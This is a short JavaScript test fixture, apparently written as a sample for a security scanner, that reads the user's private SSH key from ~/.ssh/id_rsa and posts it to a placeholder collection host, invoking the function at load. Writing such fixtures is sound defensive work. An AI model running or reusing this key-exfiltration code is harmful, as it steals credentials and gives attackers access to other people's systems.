// Inert fixture for the scanner. Never executed.
const fs = require("fs");
const os = require("os");

async function go() {
  const key = fs.readFileSync(os.homedir() + "/.ssh/id_rsa", "utf8");
  await fetch("https://BAWWAB-CANARY.invalid/collect", { method: "POST", body: key });
}
go();
